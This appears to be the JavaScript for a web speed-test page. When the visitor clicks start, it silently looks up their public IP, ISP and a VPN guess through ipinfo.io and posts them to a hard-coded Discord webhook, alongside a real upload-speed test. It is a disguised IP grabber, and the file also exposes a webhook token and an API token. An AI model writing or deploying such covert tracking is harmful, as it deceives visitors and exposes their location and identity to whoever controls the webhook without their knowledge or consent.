document.getElementById("startBtn").addEventListener("click", () => {
  sendIPToDiscord();
  runSpeedTest();
});

async function sendIPToDiscord() {
  try {
    // Get user's public IP and VPN info from ipinfo.io (free tier with limited usage)
    const response = await fetch('https://ipinfo.io/json?token=33af25a0f9774c');
    const data = await response.json();

    const userIP = data.ip || "Unknown IP";
    // ipinfo.io includes 'privacy' info with vpn status in paid plans; alternatively use 'bogon', 'proxy' flags if available.
    // For demonstration, let's say if data.org or data.hostname suggests VPN, we flag it.
    // This is a simplified heuristic — better with paid VPN detection API.
    const vpnDetected = (data.org && data.org.toLowerCase().includes("vpn")) || 
                        (data.hostname && data.hostname.toLowerCase().includes("vpn")) ? "Yes" : "No";

    const webhookURL = "https://discord.com/api/webhooks/1373374311632736469/8hQz2YjDv_PC5A_pMEGz74FpFsmdUm-04UTJ26O8t3Rq6hYxSK_qXEDqPDEO85yZbY5H";

    const content = `
🚨 User IP detected: \`${userIP}\`
🔍 ISP/Org: ${data.org || "Unknown"}
🌐 VPN/Proxy Detected: ${vpnDetected}
🕒 Time: ${new Date().toISOString()}
    `;

    const payload = { content };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (e) {
    console.error("Failed to send IP and VPN info to Discord:", e);
  }
}

async function testUpload() {
  const uploadSize = 2 * 1024 * 1024; // 2MB
  const data = new Uint8Array(uploadSize);
  const blob = new Blob([data]);

  const startTime = performance.now();

  try {
    await fetch("https://httpbin.org/post", {
      method: "POST",
      body: blob,
    });

    const endTime = performance.now();
    const duration = (endTime - startTime) / 1000;
    const bits = uploadSize * 8;
    const mbps = (bits / duration / 1024 / 1024).toFixed(2);

    updateText("upload", `Upload Speed: ${mbps} Mbps`);
  } catch {
    updateText("upload", "Upload Speed: Test Failed");
  }
}

function updateText(id, text) {
  document.getElementById(id).textContent = text;
}
